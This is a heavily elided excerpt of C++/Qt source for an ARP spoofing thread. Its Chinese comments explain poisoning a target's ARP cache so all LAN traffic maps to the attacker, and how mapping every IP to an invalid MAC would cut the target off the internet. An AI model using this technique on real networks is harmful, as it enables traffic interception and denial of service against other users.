...
ArpAttackThread::ArpAttackThread(uint32_t atkIPAddr, uint8_t* atkMacAddr, uint32_t curIPAddr, uint32_t broadcastAddr,
                                 uint32_t networkAddr, const uint8_t* curMacAddr, QString adapterName, QObject *parent): QThread(parent)
{
...
void ArpAttackThread::run(){
    ...
    // 构造ARP请求包，2字节及以上的存在大小端对齐问题，需要转换为网络字节序
    ArpPackage package;
    ...
    while(true){
        if(this->isAttack == false)
            break;
        // 发送ARP应答包，将攻击目标ARP缓存中的局域网中所有的MAC地址全部改为自己，达到ARP欺骗的目的
        // 如果想让对方不能上网很简单，将 0.0.0.0-255.255.255.255 所有IP对应的MAC地址都改为无效的MAC就能达到
